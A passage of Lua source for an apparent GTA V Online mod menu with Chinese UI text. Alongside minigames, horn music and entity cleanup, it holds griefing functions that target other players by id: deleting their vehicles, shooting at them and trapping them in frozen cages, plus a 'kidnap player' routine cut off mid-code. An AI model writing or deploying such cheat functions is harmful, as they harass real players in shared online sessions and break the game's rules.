        util.toast("修改游戏时间至>"..time_selector.display_options[index][2].."<")
    end
end
function Target_build_height_3D(index)
    shoot_max_height = simple3d_target_max_height.height_value[index]
    if simple_3d_started then
        util.toast("将简单3D生成高度修改为 >"..simple3d_target_max_height.display_options[index][2].."< 更改将应用于下一场比赛")
    else
        util.toast("将简单3D生成高度修改为 >"..simple3d_target_max_height.display_options[index][2].."<")
    end
end
--------2D射击
ped_health_2d = ped_health
local time_2d = 0
function Shooting_simulation_2D(toggle)
    on = toggle
    simple_2d_started = true
    simple_3d_toggle:trigger(false)
    time = time_2d
    menu.trigger_commands("time 11; locktime on")
    clear_all_peds()
    local target_ped = create_ped_simple_2d(ped_health_2d)
    HUD.ADD_BLIP_FOR_ENTITY(target_ped)
    local kills = 0
    local end_time = util.current_time_millis() + time
    while on do 
        TASK.TASK_STAND_STILL(target_ped, 1000000)
        -----DRAW INFO BOX
        local cur_time = util.current_time_millis()
        local timer = ((end_time - cur_time)/1000)
        if time > 0 then
            txt = ("得分: "..kills.." | 时间: "..toint(timer))
        else
            txt = ("得分: "..kills.." | 时间: ∞")
        end
        local size_x, size_y = directx.get_text_size((txt), 0.7)
        local shoot_pos_x = (0.5 - size_x/2)
        local shoot_pos_y = 0.015
        directx.draw_rect(shoot_pos_x - 0.01, shoot_pos_y - 0.01, size_x + 0.02, size_y + 0.02, shoot_bg_colour)
        directx.draw_text(shoot_pos_x, shoot_pos_y, txt, 0, 0.70, shoot_text_colour, true ) 
        if timer <= 0 and time > 0 then
            util.toast("2D射击已经结束 | 得分: "..kills.." | 时间: "..toint(time/1000).."s.")
            simple_2d_started = false
            end_minigame(simple_2d_toggle)
        end
        ------TARGET HANDLER
        if ENTITY.IS_ENTITY_DEAD(target_ped) then
            clear_dead_peds()
            if timer > 0 or time == 0 then
                kills = kills + 1
                target_ped = create_ped_simple_2d(ped_health_2d)
                HUD.ADD_BLIP_FOR_ENTITY(target_ped)
            end
        end
        util.yield()
    end
    if not on then 
        simple_2d_started = false
        clear_all_peds()
    end
end
function Set_condition_2D(index)
    ped_health_2d = ped_health_selector.healh_values[index]
    if simple_2d_started then
        util.toast("将设定状况修改为>"..ped_health_selector.display_options[index][2].."<更改将在下一场比赛中应用")
    else
        util.toast("将设定状况修改为>"..ped_health_selector.display_options[index][2].."<")
    end
end
function Set_shoot_time_2D(index)
    time_2d = time_selector.value[index]
    if simple_2d_started then
        util.toast("修改游戏时间至>"..time_selector.display_options[index][2].."< 更改将在下一场比赛中应用。")
    else
        util.toast("修改游戏时间至>"..time_selector.display_options[index][2].."<")
    end
end



--------载具喇叭音乐
local pitch_map = {rest = 0, C = 16, D = 17, E = 18, F = 19, G = 20, A = 21, B = 22, C2 = 23,}
local rest = 0
local quarter = 0.25
local MOD_HORN = 14
local horn_on = false
function get_note(note)
    if type(note) ~= "table" then
        note = {pitch=note}
    end
    if type(note.pitch) ~= "number" then
        note.pitch = pitch_map[note.pitch]
    end
    if note.length == nil then
        note.length = quarter
    end
    return note
end
function play_note(vehicle, song, note, index)
    note = get_note(note)
    local note_playtime = math.floor(song.beat_length * note.length)
    if note.pitch ~= rest then
        horn_on = true
    end
    util.yield(note_playtime)
    horn_on = false
    if song.notes[index+1] ~= nil then
        local next_note = get_note(song.notes[index+1])
        if next_note.pitch ~= rest then
            VEHICLE.SET_VEHICLE_MOD(vehicle, MOD_HORN, next_note.pitch)
        end
    end
    util.yield(song.beat_length - note_playtime)
end
function play_song(song)
    song.beat_length = math.floor(60000 / song.bpm)
    if not PED.IS_PED_IN_ANY_VEHICLE(PLAYER.PLAYER_PED_ID(), true) then
        util.toast("你必须在车内,否则无法开启喇叭音乐.")
        return
    end
    local vehicle = PED.GET_VEHICLE_PED_IS_IN(PLAYER.PLAYER_PED_ID(), false)
    if vehicle then
        local original_horn = VEHICLE.GET_VEHICLE_MOD(vehicle, MOD_HORN)
        play_note(vehicle, song, rest, 0)
        for index, note in pairs(song.notes) do
            play_note(vehicle, song, note, index)
        end
        VEHICLE.SET_VEHICLE_MOD(vehicle, MOD_HORN, original_horn)
    end
end
function load_horn_from_file(filepath)
    local file = io.open(filepath, "r")
    if file then
        local data = json.decode(file:read("*a"))
        if not data.target_version then
            util.toast("无效的喇叭文件格式")
            return 0
        end
        file:close()
        return data
    else
        error("无法读取文件" .. filepath)
    end
    return 0
end
function load_songs(directory)
    local loaded_songs = {}
    for _, filepath in ipairs(filesystem.list_files(directory)) do
        local ext = string.match(filepath, ".+%.(%w+)$")
        if not filesystem.is_dir(filepath) and ext == "horn" then
            local val = load_horn_from_file(filepath)
            if val ~= 0 then table.insert(loaded_songs, val) end
        end
    end
    return loaded_songs
end
util.create_tick_handler(function()
    if horn_on then
        PAD2._SET_CONTROL_NORMAL(0, 86, 1)
    end
    return true
end)




-----清理实体
function clean_select_entities(val)
    if val == 1 then
        for k,ent in pairs(entities.get_all_peds_as_handles()) do
            if not PED.IS_PED_A_PLAYER(ent) then
                ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
                delete_entity(ent)
            end
        end
        util.toast("NPC清除完成")
        return
    end
    if val == 2 then
        for k, ent in pairs(entities.get_all_vehicles_as_handles()) do
            local PedInSeat = VEHICLE.GET_PED_IN_VEHICLE_SEAT(ent, -1, false)
            if not PED.IS_PED_A_PLAYER(PedInSeat) then
                ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
                delete_entity(ent)
            end
        end
        util.toast("载具清除完成")
        return
    end
    if val == 3 then
        for k,ent in pairs(entities.get_all_objects_as_handles()) do
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
            delete_entity(ent)
        end
        util.toast("物体已清除")
        return
    end
    if val == 4 then
        for k,ent in pairs(entities.get_all_pickups_as_handles()) do
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
            delete_entity(ent)
        end
        util.toast("拾取物已清除")
        return
    end
    if val == 5 then
        local temp = memory.alloc(4)
        for i = 0, 100 do
            memory.write_int(temp, i)
            PHYSICS.DELETE_ROPE(temp)
        end
        util.toast("绳索已清除")
        return
    end
    if val == 6 then
        local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), false)
        MISC.CLEAR_AREA_OF_PROJECTILES(pos.x, pos.y, pos.z, 400, 0)
        util.toast("投掷物已清除")
        return
    end
    if val == 7 then
        CAM.DESTROY_ALL_CAMS(true)
        util.toast("相机已清除")
        return
    end
end
------普通清除
function Normal_clearance()
    local ct = 0
    for k,ent in pairs(entities.get_all_vehicles_as_handles()) do
        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
        delete_entity(ent)
        ct = ct + 1
    end
    for k,ent in pairs(entities.get_all_peds_as_handles()) do
        if not PED.IS_PED_A_PLAYER(ent) then
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
            delete_entity(ent)
        end
            ct = ct + 1
        end
end
-----超级清除
function super_clear()
    local cleanse_entitycount = 0
    for _, ped in pairs(entities.get_all_peds_as_handles()) do
        if ped ~= PLAYER.PLAYER_PED_ID() and not PED.IS_PED_A_PLAYER(ped) and NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ped) and (not NETWORK.NETWORK_IS_ACTIVITY_SESSION() or NETWORK.NETWORK_IS_ACTIVITY_SESSION() and not ENTITY.IS_ENTITY_A_MISSION_ENTITY(ped)) then
            delete_entity(ped)
            cleanse_entitycount = cleanse_entitycount + 1
            util.yield()
        end
    end
    util.toast("已清除 " .. cleanse_entitycount .. " Peds")
    cleanse_entitycount = 0
    for _, vehicle in ipairs(entities.get_all_vehicles_as_handles()) do
        if vehicle ~= PED.GET_VEHICLE_PED_IS_IN(PLAYER.PLAYER_PED_ID(), false) and DECORATOR.DECOR_GET_INT(vehicle, "Player_Vehicle") == 0 and NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(vehicle) then
            delete_entity(vehicle)
            cleanse_entitycount = cleanse_entitycount + 1
            util.yield()
        end
    end
    util.toast("已清除 ".. cleanse_entitycount .." 载具")
    cleanse_entitycount = 0
    for _, object in pairs(entities.get_all_objects_as_handles()) do
        delete_entity(object)
        cleanse_entitycount = cleanse_entitycount + 1
        util.yield()
    end
    util.toast("已清除 " .. cleanse_entitycount .. " 物体")
    cleanse_entitycount = 0
    for _, pickup in pairs(entities.get_all_pickups_as_handles()) do
        delete_entity(pickup)
        cleanse_entitycount = cleanse_entitycount + 1
        util.yield()
    end
    util.toast("已清除 " .. cleanse_entitycount .. " 可拾取物体")
    local temp = memory.alloc(4)
    for i = 0, 100 do
        memory.write_int(temp, i)
        PHYSICS.DELETE_ROPE(temp)
        util.yield()
    end
    util.toast("已清除所有绳索")
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())
    MISC.CLEAR_AREA_OF_PROJECTILES(pos.x, pos.y, pos.z, 400, 0)
    util.toast("已清除所有投掷物")
    CAM.DESTROY_ALL_CAMS(true)
    util.toast("已清除所有相机")
end


-----在玩家身上下雨
function Delcar(vic)
    if PED.IS_PED_IN_ANY_VEHICLE(vic) ==true then
        local tarcar = PED.GET_VEHICLE_PED_IS_IN(vic, true)
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(tarcar)
        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(tarcar)
        delete_entity(tarcar)
    end
end
local mir = {weap = 'WEAPON_SNOWBALL'}
function Rain_on_players(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local targets = PLAYER.GET_PLAYER_PED(pid)
    local tar1 = ENTITY.GET_ENTITY_COORDS(targets, true)
    local weap = util.joaat(mir.weap)
    Delcar(targets)
    WEAPON.REQUEST_WEAPON_ASSET(weap)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(tar1.x, tar1.y, tar1.z, tar1.x , tar1.y, tar1.z - 2.0, 200, 0, weap, 0, true, false, 1000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(tar1.x, tar1.y, tar1.z + 1.0, tar1.x , tar1.y, tar1.z, 200, 0, weap, 0, true, false, 1000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(tar1.x, tar1.y + 1.0, tar1.z, tar1.x , tar1.y, tar1.z, 200, 0, weap, 0, true, false, 1000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(tar1.x + 1.0, tar1.y , tar1.z, tar1.x , tar1.y, tar1.z, 200, 0, weap, 0, true, false, 1000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(tar1.x + 1.0, tar1.y + 1.0, tar1.z, tar1.x , tar1.y, tar1.z, 200, 0, weap, 0, true, false, 1000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(tar1.x - 1.0, tar1.y, tar1.z, tar1.x , tar1.y, tar1.z, 200, 0, weap, 0, true, false, 1000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(tar1.x, tar1.y - 1.0, tar1.z, tar1.x , tar1.y, tar1.z, 200, 0, weap, 0, true, false, 1000)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(tar1.x - 1.0, tar1.y - 1.0, tar1.z, tar1.x , tar1.y, tar1.z, 200, 0, weap, 0, true, false, 1000)
end
function Rain_on_players_type(weapsel, text)
    mir.weap = Weap[weapsel]
    menu.set_menu_name(mirloop, '在玩家身上下雨 ' ..': '.. text)
end


-----垂直堆叠
function get_model_size(hash)
    local minptr = memory.alloc(24)
    local maxptr = memory.alloc(24)
    MISC.GET_MODEL_DIMENSIONS(hash, minptr, maxptr)
    local min = memory.read_vector3(minptr)
    local max = memory.read_vector3(maxptr)
    local size = {}
    size['x'] = max['x'] - min['x']
    size['y'] = max['y'] - min['y']
    size['z'] = max['z'] - min['z']
    size['max'] = math.max(size['x'], size['y'], size['z'])
    return size
end
function setstacky(s)
    local player_cur_car = entities.get_user_vehicle_as_handle()
    if player_cur_car ~= 0 then
        old_veh = player_cur_car
        for i=1, s do
            local c = ENTITY.GET_ENTITY_COORDS(old_veh, false)
            local mdl = ENTITY.GET_ENTITY_MODEL(player_cur_car)
            local size = get_model_size(mdl)
            local r = ENTITY.GET_ENTITY_ROTATION(old_veh, 0)
            new_veh = entities.create_vehicle(mdl, players.get_position(PLAYER.PLAYER_ID()), ENTITY.GET_ENTITY_HEADING(old_veh))
            ENTITY.ATTACH_ENTITY_TO_ENTITY(new_veh, old_veh, 0, 0.0, 0.0, size.z, 0.0, 0.0, 0.0, true, false, false, false, 0, true, 0)
            old_veh = new_veh
        end
    end
end
----水平堆叠
function setstackx(s)
    local player_cur_car = entities.get_user_vehicle_as_handle()
    if player_cur_car ~= 0 then
        for i=1, s do
            main_veh = player_cur_car
            local c = ENTITY.GET_ENTITY_COORDS(main_veh, false)
            local mdl = ENTITY.GET_ENTITY_MODEL(main_veh)
            local size = get_model_size(mdl)
            local r = ENTITY.GET_ENTITY_ROTATION(main_veh, 0)
            left_new = entities.create_vehicle(mdl, players.get_position(PLAYER.PLAYER_ID()), ENTITY.GET_ENTITY_HEADING(main_veh))
            ENTITY.ATTACH_ENTITY_TO_ENTITY(left_new, main_veh, 0, -size.x*i, 0.0, 0.0, 0.0, 0.0, 0.0, true, false, false, false, 0, true, 0)
            right_new = entities.create_vehicle(mdl, players.get_position(PLAYER.PLAYER_ID()), ENTITY.GET_ENTITY_HEADING(main_veh))
            ENTITY.ATTACH_ENTITY_TO_ENTITY(right_new, main_veh, 0, size.x*i, 0.0, 0.0, 0.0, 0.0, 0.0, true, false, false, false, 0, true, 0)
        end
    end
end


--------抛掷载具
function throw_vehs(toggled)
    local hands_up = not toggled
    local entity_held = 0
    throw_vehs_toggled = toggled
    while throw_vehs_toggled do
        if PAD.IS_DISABLED_CONTROL_JUST_PRESSED(0, 38) and not PED.IS_PED_IN_ANY_VEHICLE(PLAYER.PLAYER_PED_ID(), true)  then
            if not hands_up then
                local veh = get_closest_vehicle(PLAYER.PLAYER_PED_ID(), 5)
                if ENTITY.IS_ENTITY_A_VEHICLE(veh) then 
                    request_anim_dict("missminuteman_1ig_2")
                    TASK.TASK_PLAY_ANIM(PLAYER.PLAYER_PED_ID(), "missminuteman_1ig_2", "handsup_enter", 8.0, 0.0, -1, 50, 0, false, false, false)
                    util.yield(500)
                    ENTITY.SET_ENTITY_ALPHA(veh, 100)
                    ENTITY.SET_ENTITY_HEADING(veh, ENTITY.GET_ENTITY_HEADING(PLAYER.PLAYER_PED_ID()))
                    ENTITY.SET_ENTITY_INVINCIBLE(veh, true)
                    request_control(veh)
                    ENTITY.ATTACH_ENTITY_TO_ENTITY(veh, PLAYER.PLAYER_PED_ID(), 0, 0, 0, get_model_size(ENTITY.GET_ENTITY_MODEL(veh)).z / 2, 180, 180, -180, true, false, true, false, 0, true, 0)
                    hands_up = true
                    entity_held = veh
                end
            else
                if ENTITY.DOES_ENTITY_EXIST(entity_held) then
                    ENTITY.DETACH_ENTITY(entity_held)
                    VEHICLE.SET_VEHICLE_FORWARD_SPEED(entity_held, 100.0)
                    VEHICLE.SET_VEHICLE_OUT_OF_CONTROL(entity_held, true, true)
                    ENTITY.SET_ENTITY_ALPHA(entity_held, 255)
                    ENTITY.SET_ENTITY_INVINCIBLE(entity_held, false)
                    TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.PLAYER_PED_ID())
                    ENTITY.FREEZE_ENTITY_POSITION(PLAYER.PLAYER_PED_ID(), true)
                    ENTITY.SET_ENTITY_NO_COLLISION_ENTITY(entity_held, PLAYER.PLAYER_PED_ID(), false)
                    request_anim_dict("melee@unarmed@streamed_core")
                    TASK.TASK_PLAY_ANIM(PLAYER.PLAYER_PED_ID(), "melee@unarmed@streamed_core", "heavy_punch_a", 8.0, 8.0, -1, 0, 0.3, false, false, false)
                    util.yield(500)
                    ENTITY.FREEZE_ENTITY_POSITION(PLAYER.PLAYER_PED_ID(), false)
                    entity_held = 0
                    hands_up = false
                else
                    hands_up = false
                    entity_held = 0
                    TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.PLAYER_PED_ID())
                end
            end
        end
        util.yield()
    end
end



------抛掷NPC
function throw_peds(toggled)
    local hands_up = not toggled
    local entity_held = 0
    throw_peds_toggled = toggled
    while throw_peds_toggled do
        if PAD.IS_CONTROL_JUST_RELEASED(38, 38) and not PED.IS_PED_IN_ANY_VEHICLE(PLAYER.PLAYER_PED_ID(), true) then
            if entity_held == 0 then
                if not hands_up then 
                    local ped = get_closest_ped(PLAYER.PLAYER_PED_ID(), 5)
                    if ped ~= nil and not PED.IS_PED_IN_ANY_VEHICLE(ped, true) and ENTITY.GET_ENTITY_HEALTH(ped) ~= 0 then
                        calm_ped(ped, true)
                        request_anim_dict("missminuteman_1ig_2")
                        TASK.TASK_PLAY_ANIM(PLAYER.PLAYER_PED_ID(), "missminuteman_1ig_2", "handsup_enter", 8.0, 0.0, -1, 50, 0, false, false, false)
                        util.yield(500)
                        ENTITY.SET_ENTITY_ALPHA(ped, 100)
                        ENTITY.SET_ENTITY_HEALTH(ped, 300, 0)
                        ENTITY.SET_ENTITY_HEADING(ped, ENTITY.GET_ENTITY_HEADING(PLAYER.PLAYER_PED_ID()))
                        request_control(ped)
                        ENTITY.ATTACH_ENTITY_TO_ENTITY(ped, PLAYER.PLAYER_PED_ID(), 0, 0, 0, 1.3, 180, 180, -180, true, false, true, true, 0, true, 0)
                        entity_held = ped
                        hands_up = true
                    end
                end
            else
                if ENTITY.IS_ENTITY_A_PED(entity_held) then
                    ENTITY.DETACH_ENTITY(entity_held)
                    ENTITY.SET_ENTITY_ALPHA(entity_held, 255)
                    PED.SET_PED_TO_RAGDOLL(entity_held, 10, 10, 0, false, false, false)
                    --ENTITY.SET_ENTITY_VELOCITY(entity_held, 0, 100, 0)
                    ENTITY.SET_ENTITY_MAX_SPEED(entity_held, 100.0)
                    ENTITY.APPLY_FORCE_TO_ENTITY(entity_held, 1, 0, 100, 0, 0, 0, 0, 0, true, false, true, false, false)
                    AUDIO.PLAY_PAIN(entity_held, 7, 0, 0)
                    TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.PLAYER_PED_ID())
                    ENTITY.FREEZE_ENTITY_POSITION(PLAYER.PLAYER_PED_ID(), true)
                    ENTITY.SET_ENTITY_NO_COLLISION_ENTITY(entity_held, PLAYER.PLAYER_PED_ID(), false)
                    request_anim_dict("melee@unarmed@streamed_core")
                    TASK.TASK_PLAY_ANIM(PLAYER.PLAYER_PED_ID(), "melee@unarmed@streamed_core", "heavy_punch_a", 8.0, 8.0, -1, 0, 0.3, false, false, false)
                    util.yield(500)
                    ENTITY.FREEZE_ENTITY_POSITION(PLAYER.PLAYER_PED_ID(), false)
                    entity_held = 0
                    hands_up = false
                else
                    hands_up = false
                    entity_held = 0
                    TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.PLAYER_PED_ID())
                end
            end
        end
        util.yield()
    end
end


-------司机服务
local taxi_ped = 0
local taxi_veh = 0
local taxi_blip = -1
function max_out_car(veh)
    for i=0, 49 do
        num = VEHICLE.GET_NUM_VEHICLE_MODS(veh, i)
        VEHICLE.SET_VEHICLE_MOD(veh, i, num -1, true)
    end
end
function summ_car(index, value)
    local vhash = util.joaat(value)
    local phash = util.joaat("s_m_y_casino_01")
    if taxi_veh ~= 0 then
        delete_entity(taxi_veh)
    end
    if taxi_ped ~= 0 then
        util.remove_blip(taxi_blip)
        delete_entity(taxi_ped)
    end 
    local plyr = PLAYER.PLAYER_PED_ID()
    local coords = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(plyr, 0.0, 5.0, 0.0)
    request_model(vhash)
    request_model(phash)
    taxi_veh = entities.create_vehicle(vhash, coords, ENTITY.GET_ENTITY_HEADING(plyr))
    max_out_car(taxi_veh)
    VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(taxi_veh, "LANCE")
    VEHICLE.SET_VEHICLE_COLOURS(taxi_veh, 145, 145)
    ENTITY.SET_ENTITY_INVINCIBLE(taxi_veh, true)
    taxi_ped = entities.create_ped(32, phash, coords, ENTITY.GET_ENTITY_HEADING(plyr))
    PED.SET_PED_RELATIONSHIP_GROUP_HASH(taxi_ped, util.joaat("rgFM_AiLike"))
    taxi_blip = HUD.ADD_BLIP_FOR_ENTITY(taxi_ped)
    HUD.SET_BLIP_COLOUR(taxi_blip, 7)
    ENTITY.SET_ENTITY_INVINCIBLE(taxi_ped, true)
    PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(taxi_ped, true)
    PED.SET_PED_FLEE_ATTRIBUTES(taxi_ped, 0, false)
    PED.SET_PED_CAN_BE_DRAGGED_OUT(taxi_ped, false)
    VEHICLE.SET_VEHICLE_EXCLUSIVE_DRIVER(taxi_veh, taxi_ped, -1)
    PED.SET_PED_INTO_VEHICLE(taxi_ped, taxi_veh, -1)
    ENTITY.SET_ENTITY_INVINCIBLE(taxi_ped, true)
    PED.SET_PED_INTO_VEHICLE(PLAYER.PLAYER_PED_ID(), taxi_veh, 0)
    util.toast("您的司机已创建！")
end
function summ_car_topoint()
    if taxi_ped == 0 then
        util.toast("你没有生成司机")
    else
        local goto_coords = get_waypoint_coords()
        if goto_coords ~= nil then
            TASK.TASK_VEHICLE_DRIVE_TO_COORD_LONGRANGE(taxi_ped, taxi_veh, goto_coords['x'], goto_coords['y'], goto_coords['z'], 300.0, 786996, 5)
        end
    end
end
function summ_car_tp()
    if taxi_ped == 0 then
        util.toast("你没有生成司机.")
    else
        PED.SET_PED_INTO_VEHICLE(PLAYER.PLAYER_PED_ID(), taxi_veh, 0)
    end
end
function summ_car_bmob()
    if taxi_ped == 0 then
        util.toast("你没有生成司机.")
    else
        local ped_copy = taxi_ped
        local veh_copy = taxi_veh
        taxi_ped = 0
        taxi_veh = 0
        local coords = ENTITY.GET_ENTITY_COORDS(veh_copy)
        ENTITY.SET_ENTITY_INVINCIBLE(veh_copy, false)
        FIRE.ADD_EXPLOSION(coords['x'], coords['y'], coords['z'], 7, 100.0, true, false, 1.0)
        ENTITY.SET_ENTITY_HEALTH(veh_copy, 0)
        ENTITY.SET_ENTITY_INVINCIBLE(ped_copy, false)
        ENTITY.SET_ENTITY_HEALTH(ped_copy, 0)
        if math.random(5) == 3 then
            util.toast("他有老婆孩子...")
        end
        util.yield(3000)
        delete_entity(ped_copy)
        delete_entity(veh_copy)
    end
end


----自定义转弯
function custom_TurnVehicle()
    local veh = PED.GET_VEHICLE_PED_IS_IN(PLAYER.PLAYER_PED_ID(), false)
    local vv = ENTITY.GET_ENTITY_ROTATION(veh, 2)
    if PAD.IS_CONTROL_PRESSED(0, 63) then 
        local yawAfterPress = vv.z + 3
        if yawAfterPress > 180 then 
            local overFlowNeg = math.abs(vv.z)*-1 
            local toSetYaw = overFlowNeg + 3
            ENTITY.SET_ENTITY_ROTATION(veh, vv.x, vv.y, toSetYaw, 2, true)
        else
            ENTITY.SET_ENTITY_ROTATION(veh, vv.x, vv.y, yawAfterPress, 2, true)
        end
    elseif PAD.IS_CONTROL_PRESSED(0, 64) then
        local yawAfterPress = vv.z - 3
        if yawAfterPress < -180 then 
            local overFlowNeg = math.abs(vv.z) 
            local toSetYaw = overFlowNeg - 3
            ENTITY.SET_ENTITY_ROTATION(veh, vv.x, vv.y, toSetYaw, 2, true)
        else
            ENTITY.SET_ENTITY_ROTATION(veh, vv.x, vv.y, yawAfterPress, 2, true)
        end
    end
end


----试验升降机
function test_elevator(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local hash = util.joaat('prop_test_elevator')
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid), false)
    for i = 0, 90, 90 do
        local cage = create_object(hash, pos.x, pos.y, pos.z)
        ENTITY.SET_ENTITY_HEADING(cage, i)
        ENTITY.SET_ENTITY_INVINCIBLE(cage,true)
        ENTITY.FREEZE_ENTITY_POSITION(cage, true)
    end
end
----监狱笼子
function Prison_cages(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local cage = {}
    local door = util.joaat("v_ilev_ph_cellgate")
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid), false)

    cage[1] = create_object(door, pos.x + 0.5, pos.y + 0.5, pos.z)
    ENTITY.FREEZE_ENTITY_POSITION(cage[1], true)

    cage[2] = create_object(door, pos.x + 0.5, pos.y - 0.8, pos.z)
    ENTITY.FREEZE_ENTITY_POSITION(cage[2], true)

    cage[3] = create_object(door, pos.x + 0.5, pos.y + 0.5, pos.z)
    ENTITY.SET_ENTITY_ROTATION(cage[3], 0.0, 0.0, 90.0, 1, true)
    ENTITY.FREEZE_ENTITY_POSITION(cage[3], true)

    cage[4] = create_object(door, pos.x - 0.8, pos.y + 0.5, pos.z)
    ENTITY.SET_ENTITY_ROTATION(cage[4], 0.0, 0.0, 90.0, 1, true)
    ENTITY.FREEZE_ENTITY_POSITION(cage[4], true)
end
----柱形笼
function pillar_cage(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local hash = util.joaat('v_ret_fh_doorframe')
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid), false)
    for i = 0, 135, 45 do
        local cage = create_object(hash, pos.x, pos.y, pos.z)
        ENTITY.SET_ENTITY_HEADING(cage, i)
        ENTITY.SET_ENTITY_INVINCIBLE(cage,true)
        ENTITY.FREEZE_ENTITY_POSITION(cage, true)
    end
end

----栅栏
function fence_cage(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local objHash = util.joaat("prop_fnclink_03e")
    request_model(objHash)
    local pos = players.get_position(pid)
    pos.z = pos.z - 1.0
    local object = {}
    object[1] = entities.create_object(objHash, v3.new(pos.x - 1.5, pos.y + 1.5, pos.z))
    object[2] = entities.create_object(objHash, v3.new(pos.x - 1.5, pos.y - 1.5, pos.z))
    object[3] = entities.create_object(objHash, v3.new(pos.x + 1.5, pos.y + 1.5, pos.z))
    local rot_3 = ENTITY.GET_ENTITY_ROTATION(object[3], 2)
    rot_3.z = -90.0
    ENTITY.SET_ENTITY_ROTATION(object[3], rot_3.x, rot_3.y, rot_3.z, 1, true)
    object[4] = entities.create_object(objHash, v3.new(pos.x - 1.5, pos.y + 1.5, pos.z))
    local rot_4 = ENTITY.GET_ENTITY_ROTATION(object[4], 2)
    rot_4.z = -90.0
    ENTITY.SET_ENTITY_ROTATION(object[4], rot_4.x, rot_4.y, rot_4.z, 1, true)
    for i = 1, 4 do ENTITY.FREEZE_ENTITY_POSITION(object[i], true) end
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(objHash)
end

----地狱笼子
function hell_cage(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local objHash = util.joaat("hei_prop_station_gate")
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid), false)
    pos.z = pos.z - 1.0
    local object = {}

    object[1] = create_object(objHash, pos.x + 2.75, pos.y + 2.75, pos.z)
    object[2] = create_object(objHash, pos.x + 2.75, pos.y + 2.75, pos.z + 2)
    object[3] = create_object(objHash, pos.x + 2.75, pos.y - 2.75, pos.z)
    object[4] = create_object(objHash, pos.x + 2.75, pos.y - 2.75, pos.z + 2)
    object[5] = create_object(objHash, pos.x + 2.75, pos.y - 2.75, pos.z)
    object[6] = create_object(objHash, pos.x + 2.75, pos.y - 2.75, pos.z + 2)
    local rot5 = ENTITY.GET_ENTITY_ROTATION(object[5], 2)
    ENTITY.SET_ENTITY_ROTATION(object[5], rot5.x, rot5.y, -90.0, 2, true)
    ENTITY.SET_ENTITY_ROTATION(object[6], rot5.x, rot5.y, -90.0, 2, true)

    object[7] = create_object(objHash, pos.x - 2.75, pos.y - 2.75, pos.z)
    object[8] = create_object(objHash, pos.x - 2.75, pos.y - 2.75, pos.z + 2)
    local rot7 = ENTITY.GET_ENTITY_ROTATION(object[7], 2)
    ENTITY.SET_ENTITY_ROTATION(object[7], rot7.x, rot7.y, -90.0, 2, true)
    ENTITY.SET_ENTITY_ROTATION(object[8], rot7.x, rot7.y, -90.0, 2, true)

    object[9] = create_object(objHash, pos.x, pos.y + 2.75, pos.z + 5)
    local rot9 = ENTITY.GET_ENTITY_ROTATION(object[9], 2)
    ENTITY.SET_ENTITY_ROTATION(object[9], 90, 90, rot9.z, 2, true)

    object[10] = create_object(objHash, pos.x, pos.y + 2.75, pos.z + 5)
    local rot10 = ENTITY.GET_ENTITY_ROTATION(object[9], 2)
    ENTITY.SET_ENTITY_ROTATION(object[10], -90, -90, rot10.z, 2, true)

    object[11] = create_object(objHash, pos.x, pos.y + 2.75, pos.z)
    ENTITY.SET_ENTITY_ROTATION(object[11], 90, 90, rot9.z, 2, true)

    object[12] = create_object(objHash, pos.x, pos.y + 2.75, pos.z)
    ENTITY.SET_ENTITY_ROTATION(object[12], -90, -90, rot10.z, 2, true)

    for i = 1, 12 do
        ENTITY.FREEZE_ENTITY_POSITION(object[i], true)
        ENTITY.SET_ENTITY_VISIBLE(object[i], true)
    end
end

----移动笼子
function kidnapplayer(pid, index, value)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local p_hash = util.joaat("s_m_y_factory_01")
        local v_hash = 0
        if index == 1 then
            v_hash = util.joaat("boxville3")
